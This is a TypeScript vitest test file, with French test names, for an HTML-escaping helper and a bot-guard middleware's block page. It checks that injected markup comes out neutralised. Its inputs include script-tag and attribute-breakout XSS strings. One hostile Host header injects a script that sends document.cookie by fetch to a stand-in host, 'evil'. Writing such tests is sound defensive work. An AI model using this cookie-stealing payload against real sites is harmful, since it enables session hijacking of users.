import { describe, it, expect, vi, beforeEach } from "vitest";
import { escapeHtml } from "../src/core";
import type { MinimalRequest, MinimalResponse } from "../src/middleware";

describe("escapeHtml", () => {
  it("neutralise une balise", () => {
    expect(escapeHtml('<script>alert(1)</script>')).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });
  it("neutralise une sortie d'attribut", () => {
    expect(escapeHtml('x"><b')).toBe('x&quot;&gt;&lt;b');
  });
  it("échappe & en premier (pas de double échappement)", () => {
    expect(escapeHtml('&lt;')).toBe('&amp;lt;');
  });
});

describe("page de blocage", () => {
  beforeEach(() => {
    globalThis.fetch = vi.fn().mockImplementation((url: string) => {
      if (url.includes('guard-detect') || url.includes('guard?')) {
        return Promise.resolve({ ok: true, text: async () => '(function(){})()' });
      }
      return Promise.resolve({ ok: true, json: async () => ({ allowed: true }) });
    });
  });

  it("un Host hostile n'introduit pas de balise", async () => {
    const { createShugoiMiddleware } = await import("../src/middleware");
    const mw = createShugoiMiddleware({ siteKey: 'sg_sk_live_t', signingSecret: 'test-secret-32bytes-long!', verifyBots: false });
    const { req, res } = (() => {
      const r = {
        headers: { 'user-agent': 'curl/8.0.0', host: 'x"><script>fetch("//evil/"+document.cookie)</script>' },
        path: '/',
      } satisfies MinimalRequest;
      const s = {
        _status: 200, _body: '', _type: '',
        status(code: number) { this._status = code; return this; },
        type(t: string) { this._type = t; return this; },
        send(b: string) { this._body = b; },
        end(b?: string) { if (b) this._body = b; },
        setHeader: vi.fn(), getHeader: vi.fn(),
      } satisfies MinimalResponse & { _body: string; _status: number; _type: string };
      return { req: r, res: s };
    })();
    const next = vi.fn();
    await mw(req, res, next);
    expect(res._body).not.toContain('<script>');
  });
});
